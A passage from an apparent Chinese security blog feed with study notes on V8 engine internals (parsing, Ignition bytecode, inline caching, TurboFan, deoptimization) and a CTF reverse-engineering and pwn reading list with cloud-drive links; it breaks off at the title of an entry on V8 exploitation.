src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-190158.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function MyObject(x) &#123;</span><br><span class="line">  this.X = x;</span><br><span class="line">&#125;</span><br><span class="line">function getX(obj) &#123;</span><br><span class="line">  return obj.X;</span><br><span class="line">&#125;</span><br><span class="line">var o = new MyObject(3);</span><br><span class="line">print(getX(o));</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">parallels@ubuntu:~/v8/v8/out.gn/x64.debug$ ./d8 test.js </span><br><span class="line">3</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-190248.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-191002.png" alt=""></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-191809.png" alt=""></p><p>用作参考：<a href="https://www.cnblogs.com/yumianhu/p/3707427.html" target="_blank" rel="noopener">https://www.cnblogs.com/yumianhu/p/3707427.html</a><br>关于IC的Cahce State,不过内容略过时。</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-192442.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-192512.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-192553.png" alt=""><br>Crankshaft已经废弃，这里只是看下type feedback和check<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-193124.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-193112.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-193028.png" alt=""></p><h2 id="理解v8-bytecode"><a href="#理解v8-bytecode" class="headerlink" title="理解v8 bytecode"></a>理解v8 bytecode</h2><p><a href="https://zhuanlan.zhihu.com/p/28590489" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/28590489</a><br>有中文翻译，读起来很快（逃<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-200254.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-203313.png" alt=""><br><a href="https://2017.jsconf.eu/speakers/" target="_blank" rel="noopener">https://2017.jsconf.eu/speakers/</a><br><a href="https://www.chromium.org/developers/how-tos/run-chromium-with-flags" target="_blank" rel="noopener">https://www.chromium.org/developers/how-tos/run-chromium-with-flags</a></p><h2 id="Parsing-JavaScript-better-lazy-than-eager"><a href="#Parsing-JavaScript-better-lazy-than-eager" class="headerlink" title="Parsing JavaScript-better lazy than eager?"></a>Parsing JavaScript-better lazy than eager?</h2><p><a href="https://www.youtube.com/watch?v=Fg7niTmNNLg" target="_blank" rel="noopener">https://www.youtube.com/watch?v=Fg7niTmNNLg</a></p><h2 id="Ignition-an-interpreter-for-v8"><a href="#Ignition-an-interpreter-for-v8" class="headerlink" title="Ignition - an interpreter for v8"></a>Ignition - an interpreter for v8</h2><h3 id="bytecode如何产生"><a href="#bytecode如何产生" class="headerlink" title="bytecode如何产生"></a>bytecode如何产生</h3><ul><li>加法<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-18-150922.png" alt=""></li><li>访问对象<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-18-151626.png" alt=""><h3 id="编译bytecode"><a href="#编译bytecode" class="headerlink" title="编译bytecode"></a>编译bytecode</h3><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-18-152050.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-23-184859.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-23-184941.png" alt=""></li></ul>]]></content>
      
      <categories>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> v8 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Source to Binary Jounrney of V8 javascript engine</title>
      <link href="/2018/06/16/nodefest_v8/"/>
      <url>/2018/06/16/nodefest_v8/</url>
      <content type="html"><![CDATA[<h2 id="What-is-V8"><a href="#What-is-V8" class="headerlink" title="What is V8?"></a>What is V8?</h2><p>v8是Google的Javascript引擎，它被采用作为Google Chrome/Node.js的Javascript引擎。</p><h2 id="Execution-flow"><a href="#Execution-flow" class="headerlink" title="Execution flow"></a>Execution flow</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-16-132557.png" alt=""></p><h2 id="Parsing"><a href="#Parsing" class="headerlink" title="Parsing"></a>Parsing</h2><h3 id="Basic-parsing"><a href="#Basic-parsing" class="headerlink" title="Basic parsing"></a>Basic parsing</h3><p>v8解析源代码并将其转换为AST抽象语法树<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-16-133048.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-16-133133.png" alt=""></p><h3 id="Split-parsing-phase"><a href="#Split-parsing-phase" class="headerlink" title="Split parsing phase"></a>Split parsing phase</h3><p>首先，直接解析所有的代码并不是很好，如果解析的代码没有被执行，这是没有意义的。<br>为了延迟解析，将parse分为两个阶段。</p><h4 id="PreParsing"><a href="#PreParsing" class="headerlink" title="PreParsing"></a>PreParsing</h4><p>事先解析所有函数的布局。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-16-133801.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-16-134324.png" alt=""><br>v8::internal::PreParser Class一次解析函数的轮廓。<br>由此得到</p><ul><li>初步的语法错误检查</li><li>函数的范围生成<h4 id="Lazy-Parsing"><a href="#Lazy-Parsing" class="headerlink" title="Lazy Parsing"></a>Lazy Parsing</h4>v8仅在调用延迟解析的函数时才进行解析。<br>更多的可参考：</li><li><a href="https://docs.google.com/presentation/d/1b-ALt6W01nIxutFVFmXMOyd_6ou_6qqP6S0Prmb1iDs/present?%20slide=id.p&amp;slide=id.p" target="_blank" rel="noopener">https://docs.google.com/presentation/d/1b-ALt6W01nIxutFVFmXMOyd_6ou_6qqP6S0Prmb1iDs/present?%20slide=id.p&amp;slide=id.p</a></li><li><a href="https://www.youtube.com/watch?v=Fg7niTmNNLg" target="_blank" rel="noopener">https://www.youtube.com/watch?v=Fg7niTmNNLg</a></li></ul><h2 id="Abstract-Syntax-Tree"><a href="#Abstract-Syntax-Tree" class="headerlink" title="Abstract Syntax Tree"></a>Abstract Syntax Tree</h2><p>V8自己实现的解析器，不使用编译器编译器，如yacc或lex。使用递归下降语法分析进行解析。</p><h3 id="Subsclass-constructor-return"><a href="#Subsclass-constructor-return" class="headerlink" title="Subsclass constructor return"></a>Subsclass constructor return</h3><p>修改继承类中的构造函数<br>在派生类的构造函数中返回表达式<br>转换为三元运算符<br>如果表达式的结果未定义，则返回该值。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-16-140018.png" alt=""></p><h3 id="for-let-const-var-in-of-e"><a href="#for-let-const-var-in-of-e" class="headerlink" title="for(let/const/var in/of e)"></a>for(let/const/var in/of e)</h3><p>为了在for-in/of的初始化中使用const/let<br>通过将其封闭在一个块中，来声明一个变量<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-16-141224.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-16-141230.png" alt=""></p><h3 id="Spread-operator"><a href="#Spread-operator" class="headerlink" title="Spread operator"></a>Spread operator</h3><p>在JavaScript的语法中，有一个名为Spread运算符的语法。<br>var x = [1，2，3];<br>var y = [… x];<br>V8会将此语法重写为完全不同的语法，如Altus的Transpiler。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-16-141136.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-16-141208.png" alt=""><br>通过这种方式，我们将其重写为等效的do和for of语法</p><h3 id="Ecmascript-–-Binary-AST"><a href="#Ecmascript-–-Binary-AST" class="headerlink" title="Ecmascript? – Binary AST"></a>Ecmascript? – Binary AST</h3><p>正如我们所看到的，AST的大小非常大，所以我们建议压缩它。</p><h2 id="Ignition"><a href="#Ignition" class="headerlink" title="Ignition"></a>Ignition</h2><h3 id="Bytecode-Interpreter"><a href="#Bytecode-Interpreter" class="headerlink" title="Bytecode Interpreter"></a>Bytecode Interpreter</h3><p>v8在执行之前将生成的AST转换成1到4字节的bytecode</p><h3 id="How-does-it-work"><a href="#How-does-it-work" class="headerlink" title="How does it work?"></a>How does it work?</h3><p>Ignition是一种基于寄存器的字节码解释器，它实际上将值分配给CPU的寄存器，并执行它们。<br>在Ignition中，预先生成一个名为BytecodeHandler的字节码处理函数，从字节码中获得一个数组索引。<br>将生成的汇编代码分配给该索引，一个接一个地调用Bytecode数组，调用相应索引的汇编程序并执行代码。</p><h3 id="Pseudo-javascript-code"><a href="#Pseudo-javascript-code" class="headerlink" title="Pseudo javascript code"></a>Pseudo javascript code</h3><p>用Javascript来模拟这个结构，看起来像这样。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-16-144250.png" alt=""></p><h3 id="How-to-create-bytecode"><a href="#How-to-create-bytecode" class="headerlink" title="How to create bytecode?"></a>How to create bytecode?</h3><p>V8准备一个称为v8::internal::AstVisitor<subclass>的基类，简称AstVisitor，从AST生成bytecode。<br>AstVisitor是一个使用Vistor模式的类。<br>在深度优先搜索AST时调用相应的回调函数。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-141853.png" alt=""></subclass></p><h3 id="BytecodeArray"><a href="#BytecodeArray" class="headerlink" title="BytecodeArray"></a>BytecodeArray</h3><p>生成的bytecode存储在BytecodeArray中。<br>BytecodeArray在函数基础上存在。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-16-145533.png" alt=""></p><h3 id="InterpreterEntryTrampoline"><a href="#InterpreterEntryTrampoline" class="headerlink" title="InterpreterEntryTrampoline"></a>InterpreterEntryTrampoline</h3><p>最终生成的字节码是从被称为InterpreterEntryTrampoline的Builtin代码执行的。<br>InterpreterEntryTrampoline被编译成Assembly，并且被当成普通的C函数调用。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-16-150607.png" alt=""></p><h3 id="Ignition-Handler"><a href="#Ignition-Handler" class="headerlink" title="Ignition Handler"></a>Ignition Handler</h3><p>前面伪代码中显示的BytecodeHandlers是V8<br>它被称为Ignition Handler<br>DSL中描述的Ignition Handler被称为CodeStubAssembler</p><h2 id="Code-Generator"><a href="#Code-Generator" class="headerlink" title="Code Generator"></a>Code Generator</h2><p>v8中有几个汇编生成点，如下</p><ul><li>CodeStub</li><li>Builtins</li><li>Runtime</li><li>BytecodeHandler<br>我明白是从Bytecode运行汇编程序，但是相应的汇编程序如何从Bytecode生成？什么是BytecodeHandler?</li></ul><h2 id="CodeStubAssember"><a href="#CodeStubAssember" class="headerlink" title="CodeStubAssember"></a>CodeStubAssember</h2><h3 id="What-is-CodeStubAssmber"><a href="#What-is-CodeStubAssmber" class="headerlink" title="What is CodeStubAssmber?"></a>What is CodeStubAssmber?</h3><p>CodeStubAssembler(CSA)将抽象代码生成为v8内部的graph generation DSL。<br>CodeGenerator只需组装预定的执行节点，即可为每个架构生成代码，因此您不必每次都编写汇编代码。</p><h3 id="Graph-based-DSL"><a href="#Graph-based-DSL" class="headerlink" title="Graph based DSL"></a>Graph based DSL</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-16-180848.png" alt=""><br>这个代码可以创建一个Graph,在执行时去使用它生成汇编。<br>Graph是使用DSL语言实现的，与c++代码的实际流程不同。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-143547.png" alt=""></p><p>由于使用了CodeStubAssembler，即使您不熟悉实际体系结构的汇编程序，也可以轻松的添加新代码。<br>而且可读性也非常高。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-16-181353.png" alt=""></p><h3 id="Assembler"><a href="#Assembler" class="headerlink" title="Assembler"></a>Assembler</h3><p>让我们来看看为每个架构实际输出代码的x64的jmp助记符<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-16-181738.png" alt=""></p><h3 id="Where-is-actually-outputting-the-assembler-in-Code-Generation"><a href="#Where-is-actually-outputting-the-assembler-in-Code-Generation" class="headerlink" title="Where is actually outputting the assembler in Code Generation"></a>Where is actually outputting the assembler in Code Generation</h3><p>名为MacroAssembler的类扮演着其角色。<br>虽然MacroAssembler的接口与体系结构无关，但在其内部调用的Assembler类会输出特定于每个体系结构的代码。<br>在V8中，MacroAssembler经常以属性名称masm频繁出现<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-144042.png" alt=""><br>最后，GraphResolver遍历Graph，通过MacroAssembler调用Assembler并输出汇编程序。</p><p>但是，MacroAssembler是进行最终的代码输出，底层抽象opcode嵌入在Graph中。<br>通过下面的层次结构，生成一个architecture-specific Graph。</p><ul><li>CodeStubAssembler</li><li>CodeAssembler</li><li>RawMachineAssembler</li><li>MachineOperatorBuilder<br>你越往下走，就越具体。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-144522.png" alt=""></li></ul><h3 id="Where-to-use"><a href="#Where-to-use" class="headerlink" title="Where to use"></a>Where to use</h3><p>Builtins使用Assembler class为不同架构生成Stub<br>一些部分使用CSA（*.gen.cc)<br>几乎所有的ignition handlers在CSA中有描述。</p><h2 id="Builtins-amp-Runtime"><a href="#Builtins-amp-Runtime" class="headerlink" title="Builtins &amp; Runtime"></a>Builtins &amp; Runtime</h2><h3 id="Builtins"><a href="#Builtins" class="headerlink" title="Builtins"></a>Builtins</h3><p>Builtins是在v8启动时被编译好的asm code fragment<br>Call Builtin就像call一个函数<br>也被称为Stub<br>没有进行runtime优化</p><h3 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h3><p>Runtime是可以从Builtins和其他汇编代码中调用的c++代码<br>连接javascript和c++<br>也没有runtime优化</p><h2 id="Inline-Caching"><a href="#Inline-Caching" class="headerlink" title="Inline Caching"></a>Inline Caching</h2><h3 id="What-is-Inline-Caching"><a href="#What-is-Inline-Caching" class="headerlink" title="What is Inline Caching"></a>What is Inline Caching</h3><p>缓存之前的访问去加速property访问速度<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-145001.png" alt=""></p><ul><li>第一次访问<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-145015.png" alt=""></li><li>第二次以后的访问<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-145029.png" alt=""><h3 id="Search-Property"><a href="#Search-Property" class="headerlink" title="Search Property"></a>Search Property</h3><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-145221.png" alt=""><br>为了从对象中找到property<br>从HashMap或者FixedArray加载属性<br>但每次都很慢<h3 id="Reduce-Property-Access"><a href="#Reduce-Property-Access" class="headerlink" title="Reduce Property Access"></a>Reduce Property Access</h3>在这个例子中，对具有相同Map的对象多次执行对y的访问。<br>由于obj已经知道Map(x,y)…<br>当然我们也知道内存布局，所以通过直接指定偏移量来访问会更快。<h3 id="Cache"><a href="#Cache" class="headerlink" title="Cache"></a>Cache</h3>所以存储特定map的访问<br>当访问你一个property的时候，Map object被记录<br>这样做之后，第二次和随后的property访问被加速<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-16-192301.png" alt=""><h3 id="Cache-Miss"><a href="#Cache-Miss" class="headerlink" title="Cache Miss"></a>Cache Miss</h3>但是当Map更改的时候，自然会发生Cache miss，因此需要重新加载该属性并在此记住它。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-150302.png" alt=""><br>Load IC-Miss and StoreIC_Miss被调用，或者通过C++ runtime得到对象的属性。</li></ul><h3 id="Cahce-State"><a href="#Cahce-State" class="headerlink" title="Cahce State"></a>Cahce State</h3><p>Cahce State状态转变如下：<br>PreMonomorphic<br>Monomorphic<br>Polymorphic<br>Megamorphic<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-191809.png" alt=""></p><h4 id="Pre-Monomorphic"><a href="#Pre-Monomorphic" class="headerlink" title="Pre Monomorphic"></a>Pre Monomorphic</h4><p>Uninitialized state-&gt;搜寻所用的隐藏类，以及获取位移。（参考上图第一次访问）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-191437.png" alt=""></p><h4 id="Monomorphic"><a href="#Monomorphic" class="headerlink" title="Monomorphic"></a>Monomorphic</h4><p>Monomorphic是Receiver的类型不变时的IC，即这是在只访问single Map的理想情况<br>在这种情况下，一个缓存就足够了，所以它将是最快的情况。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-191514.png" alt=""></p><h4 id="Polymorphic"><a href="#Polymorphic" class="headerlink" title="Polymorphic"></a>Polymorphic</h4><p>Polymorphic是在两种或更多类型的Receiver类型存在时被设置。<br>由于Polymorphic是循环搜索缓存的Map，找到应该使用的那个，所以它比Monomorphic慢，但比没有IC快得多。<br><strong>（Map存储在FixedArray中，从多个Map搜索并执行属性访问的缓存）</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-191552.png" alt=""></p><h4 id="Megamorphic"><a href="#Megamorphic" class="headerlink" title="Megamorphic"></a>Megamorphic</h4><p>由于Miss太多，停止进行Map记录的状态。<br>通过从Stub调用GetProperty，来从哈希表中搜索，是获取properties最慢的状态。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-191842.png" alt=""></p><h3 id="Access-inherited-properties"><a href="#Access-inherited-properties" class="headerlink" title="Access inherited properties"></a>Access inherited properties</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-192442.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-192512.png" alt=""></p><h3 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-192553.png" alt=""></p><h2 id="Optimization"><a href="#Optimization" class="headerlink" title="Optimization"></a>Optimization</h2><h3 id="Hot-or-Small"><a href="#Hot-or-Small" class="headerlink" title="Hot or Small"></a>Hot or Small</h3><p>对满足以下条件的代码优化<br>（function字节码长度/1200）+ function被调用2次<br>函数很小（字节码长度小于90）</p><h3 id="Optimization-Budget"><a href="#Optimization-Budget" class="headerlink" title="Optimization Budget"></a>Optimization Budget</h3><p>Optimization Budget(优化预算）在字节码执行期间被分配给每个函数，当其值低于0时，成为候选优化代码。</p><h3 id="For-loop"><a href="#For-loop" class="headerlink" title="For loop"></a>For loop</h3><p>优化For循环<br>在循环中，输出称为JumpLoop的字节码<br>通过这个JumpLoop，返回终点的地址的值的偏移量被加权<br>从之前的Budget(预算)中扣除一个值，当它变成0的时候，对loop的优化将发生。</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-063748.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-064529.png" alt=""></p><h3 id="OSR-OnStackReplacement"><a href="#OSR-OnStackReplacement" class="headerlink" title="OSR - OnStackReplacement"></a>OSR - OnStackReplacement</h3><p>在代码被编译和从bytecode到machine language之后，jump终点被改变，循环代码被切换到优化编译好的机器码。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-183524.png" alt=""></p><h3 id="For-function"><a href="#For-function" class="headerlink" title="For function"></a>For function</h3><p>在函数调用的情况下，计算被Ignition生成的Return Bytecode在BytecodeHandler中的调用次数，如果超过一个阈值，就执行中断，并编译bytecode，替换原来的函数体。<br><strong>（如果是函数，会生成一个Return bytecode,在此处中断并进行budget检查）</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-184051.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-065216.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-065239.png" alt=""></p><h3 id="Concurrent-Compilation"><a href="#Concurrent-Compilation" class="headerlink" title="Concurrent Compilation"></a>Concurrent Compilation</h3><p>并行编译在对函数进行优化时是异步完成的，因此它不一定会针对后续函数调用进行优化<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-065540.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-065647.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-065711.png" alt=""></p><h3 id="Budget-for-function"><a href="#Budget-for-function" class="headerlink" title="Budget for function"></a>Budget for function</h3><p>即使loop被分割，整个预算也会被计算出来，即使是Return也是如此，所以优化没有问题。</p><h2 id="TurboFan"><a href="#TurboFan" class="headerlink" title="TurboFan"></a>TurboFan</h2><h3 id="What-is-TurboFan"><a href="#What-is-TurboFan" class="headerlink" title="What is TurboFan?"></a>What is TurboFan?</h3><p>TurboFan是V8的编译优化组件<br>在V8中，当bytecode的优化编译发生，它生成一个IR<br>TurboFan进行Graph generation和优化<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-071141.png" alt=""></p><h3 id="IR"><a href="#IR" class="headerlink" title="IR"></a>IR</h3><p>抽象执行块<br>Control Flow Graph<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-071419.png" alt=""></p><h3 id="Optimization-1"><a href="#Optimization-1" class="headerlink" title="Optimization"></a>Optimization</h3><p>TurboFan优化graph</p><ul><li>inline<br>内联函数调用</li><li>trimming<br>未到达节点删除</li><li>type<br>类型推断</li><li>typed-lowering<br>根据类型将表达式和指令替换为更简单的处理</li><li>loop-peeling<br>取出循环内的处理。</li><li>loop-exit-elimination<br>删除Loop Exit</li><li>load-elimination<br>删除不必要的读取和检查</li><li>simplified-lowering<br>用更具体的值来进行指令的简单转换</li><li>generic-lowering<br>将JS前缀指令转换为更简单的调用和stub调用</li><li>dead-code-elimination<br>删除无法访问的代码</li></ul><h3 id="Code-generation"><a href="#Code-generation" class="headerlink" title="Code generation"></a>Code generation</h3><p>最终，Class InstructionSelector分配寄存器<br>根据Graph，CodeGenerator生成机器码<br>将汇编代码写入PC（ProgramCounter）</p><h2 id="Deoptimization"><a href="#Deoptimization" class="headerlink" title="Deoptimization"></a>Deoptimization</h2><h3 id="What-is-Deoptimization"><a href="#What-is-Deoptimization" class="headerlink" title="What is Deoptimization?"></a>What is Deoptimization?</h3><p>Deoptimization在有意料之外的值被传递到优化后的Assembly code时，对函数重新进行编译。<br>让我们看一个Deoptimization发生的例子</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-080927.png" alt=""></p><h3 id="Wrong-Map"><a href="#Wrong-Map" class="headerlink" title="Wrong Map"></a>Wrong Map</h3><p>在这个例子中，我们为第一个Map{(x)}输出一个优化的Assembly，<br>但是由于第二次调用的是{(x，y)}Map，因此它被强制重新编译<br>让我们看一下汇编<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-081254.png" alt=""></p><h3 id="Bailout"><a href="#Bailout" class="headerlink" title="Bailout"></a>Bailout</h3><p>检查map是否正确<br>当Deoptimization完成后，代码返回到字节码执行</p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-184155.png" alt=""><br>以上是V8执行JS的过程<br>为了节省，省略了GC<br>（下载的pdf不能复制粘贴，大部分翻译是谷歌翻译相机拍下来然后识别翻译的，我尽量把我能理解的部分都纠正了）</p>]]></content>
      
      <categories>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> v8 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ctf re/pwn入门书单</title>
      <link href="/2018/05/31/shudan/"/>
      <url>/2018/05/31/shudan/</url>
      <content type="html"><![CDATA[<p>因为之前经常有人问我入门看什么书……就写一下吧。</p><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><h3 id="c-反汇编技术解密"><a href="#c-反汇编技术解密" class="headerlink" title="c++反汇编技术解密"></a>c++反汇编技术解密</h3><p>链接:<a href="https://pan.baidu.com/s/1d-XqvHTU85K88aDwMNBl5w" target="_blank" rel="noopener">https://pan.baidu.com/s/1d-XqvHTU85K88aDwMNBl5w</a>  密码:k0aa<br>介绍：这本是完整看完了的，后面关于对象和类写的不错。</p><h3 id="使用OllyDbg从零开始Cracking-已完结）"><a href="#使用OllyDbg从零开始Cracking-已完结）" class="headerlink" title="使用OllyDbg从零开始Cracking(已完结）"></a>使用OllyDbg从零开始Cracking(已完结）</h3><p>链接:<a href="https://pan.baidu.com/s/1ntwXQYX" target="_blank" rel="noopener">https://pan.baidu.com/s/1ntwXQYX</a><br>解压密码:pediy<br>介绍：学习od使用的教程，动手实践上不错，翻译和配套资料在看雪可以搜到。</p><h3 id="逆向工程权威指南"><a href="#逆向工程权威指南" class="headerlink" title="逆向工程权威指南"></a>逆向工程权威指南</h3><p><a href="https://beginners.re/" target="_blank" rel="noopener">https://beginners.re/</a><br>链接:<a href="https://pan.baidu.com/s/1BtJEsqE2e_DHFlzJWrJw2g" target="_blank" rel="noopener">https://pan.baidu.com/s/1BtJEsqE2e_DHFlzJWrJw2g</a>  密码:wenn</p><h2 id="pwn（浏览器、内核什么的书就不安利了……太多了，只写一下学ctf-pwn看过的书）"><a href="#pwn（浏览器、内核什么的书就不安利了……太多了，只写一下学ctf-pwn看过的书）" class="headerlink" title="pwn（浏览器、内核什么的书就不安利了……太多了，只写一下学ctf pwn看过的书）"></a>pwn（浏览器、内核什么的书就不安利了……太多了，只写一下学ctf pwn看过的书）</h2><h3 id="0day安全2"><a href="#0day安全2" class="headerlink" title="0day安全2"></a>0day安全2</h3><p>链接:<a href="https://pan.baidu.com/s/1LITCWADikf7bBUskZiFHAA" target="_blank" rel="noopener">https://pan.baidu.com/s/1LITCWADikf7bBUskZiFHAA</a>  密码:0zgo<br>介绍：我只看了前半本的内容，书有点老了，感觉看不看没影响。</p><h3 id="深入理解计算机系统"><a href="#深入理解计算机系统" class="headerlink" title="深入理解计算机系统"></a>深入理解计算机系统</h3><p>链接:<a href="https://pan.baidu.com/s/1gtB8fEUUtFj8blwJnajICQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1gtB8fEUUtFj8blwJnajICQ</a>  密码:yx0s<br>介绍：必读书，读了大概一个周，不求全懂，大概用到的地方都看过了，其他的用到再查了，其实内容也不是很深。</p><h3 id="程序员的自我修养"><a href="#程序员的自我修养" class="headerlink" title="程序员的自我修养"></a>程序员的自我修养</h3><p>链接:<a href="https://pan.baidu.com/s/1cALpx_D_9CR9hWWM9rIMwQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1cALpx_D_9CR9hWWM9rIMwQ</a>  密码:73pe<br>介绍: 必读的基础书，讲Linux上的程序装载链接什么的，很有意义。</p><h3 id="glibc内存管理ptmalloc源代码分析"><a href="#glibc内存管理ptmalloc源代码分析" class="headerlink" title="glibc内存管理ptmalloc源代码分析"></a>glibc内存管理ptmalloc源代码分析</h3><p>链接:<a href="https://pan.baidu.com/s/1-0odrFdV0Dn7xgehicuz0A" target="_blank" rel="noopener">https://pan.baidu.com/s/1-0odrFdV0Dn7xgehicuz0A</a>  密码:su8n<br>介绍：理解Linux堆管理的必读书</p><h3 id="漏洞战争"><a href="#漏洞战争" class="headerlink" title="漏洞战争"></a>漏洞战争</h3><p>链接:<a href="https://pan.baidu.com/s/1Myfox3OWTHWqeW8n82NI4w" target="_blank" rel="noopener">https://pan.baidu.com/s/1Myfox3OWTHWqeW8n82NI4w</a>  密码:r8i0<br>介绍：很好的书，里面的案例能调的都值得调一下。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>书的话入门看看就好，也没必要从头看到尾，用到的内容记住，其他的知道在哪查就好（反正仔细看完也会忘干净的，指自己）<br>一般一本几百页的书，最多看一个周就看完了，如果我只需要看其中一部分可能更快。<br>大部分学习用到的东西都是谷歌搜索，看PPT和博客，这部分就不补充了（因为太多了）</p>]]></content>
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门书单 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>v8 exploit</title>
      <link href="/2018/05/06/v8/"/>
      <url>/2018/05/06/v8/</url>
